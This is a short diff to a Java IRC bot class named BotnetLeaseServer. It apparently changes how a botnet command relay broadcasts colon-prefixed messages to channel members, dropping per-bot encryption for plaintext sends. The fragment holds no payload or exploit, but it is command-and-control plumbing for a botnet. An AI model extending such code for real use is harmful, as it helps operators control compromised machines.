@@ -316,9 +316,9 @@ public class BotnetLeaseServer extends PircBot {
 		//Respond to a message beginning with a colon by messaging the CHANNEL
 		} else if (s.startsWith(":")) {
 			// TODO: encrypt s.substring
-			String[] bots = getUserNames();
-			for (String name : bots) {
-				sendMessage(name, botKeys.get(name).encryptMsg(s.substring(1)));
+			User[] bots = getUsers(CHANNEL);
+			for (User bot : bots) {
+				sendMessage(bot.getNick(), s.substring(1));
 			}
 		}
 	}
